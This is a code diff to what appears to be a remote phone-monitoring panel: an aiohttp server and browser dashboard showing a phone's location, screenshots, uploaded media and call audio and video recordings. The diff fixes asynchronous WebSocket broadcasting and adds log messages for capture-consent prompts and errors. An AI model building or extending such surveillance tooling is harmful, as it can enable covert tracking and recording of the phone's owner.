@@ -94,15 +94,19 @@ def log(line: str) -> None:
     print(f"[{time.strftime('%H:%M:%S')}] {line}", flush=True)
 
 
-def broadcast_ui(text: str) -> None:
-    dead: list[web.WebSocketResponse] = []
-    for ws in list(ui_clients):
-        try:
-            ws.send_str(text)
-        except Exception:
-            dead.append(ws)
-    for ws in dead:
+async def _ui_send(ws: web.WebSocketResponse, text: str) -> None:
+    try:
+        await ws.send_str(text)
+    except Exception:
         ui_clients.discard(ws)
+
+
+def broadcast_ui(text: str) -> None:
+    """Fire-and-forget push to every open browser tab.
+    send_str is a coroutine, so it must be scheduled on the running loop
+    (all callers are aiohttp handlers) rather than called bare."""
+    for ws in list(ui_clients):
+        asyncio.ensure_future(_ui_send(ws, text))
 
 
 def push_event(mtype: str, payload: dict | None = None, ts: int | None = None) -> dict:
@@ -1007,6 +1011,8 @@ function connect(){
     else if(t==='location'){logLine(`📍 ${p.lat},${p.lon} · acc ${p.accuracy} m`);if(tab==='location')renderLocations();}
     else if(t==='screenshot'){logLine(`📷 screenshot received`,'good');}
     else if(t==='media_uploaded'){logLine(`⬆ ${p.kind||'file'} uploaded (${(p.size/1024).toFixed(0)} KB)`+(p.category?` [${p.category}]`:''),'good');if(tab==='video'&&p.kind==='video')openTab('video');if(tab==='audio'&&p.kind==='audio')openTab('audio');if(tab==='call_video'&&p.kind==='video'&&p.category==='call_video')openTab('call_video');if(tab==='call_audio'&&p.kind==='audio'&&p.category==='call_audio')openTab('call_audio');}
+    else if(t==='capture_consent_needed'||t==='record_consent_needed'||t==='deviceaudio_consent_needed'||t==='call_video_consent_needed'){logLine(`⚠ ${p.reason==='screen_capture_consent_required'?'phone owner must tap the screen-capture button once':p.reason}`,'bad');}
+    else if(t==='mic_error'||t==='location_error'||t==='recording_error'||t==='deviceaudio_error'){logLine(`⚠ ${t.replace('_error','')} error: ${p.reason||'unknown'}`,'bad');}
     else logLine(`[${t}] ${JSON.stringify(p)}`);
   };
 }
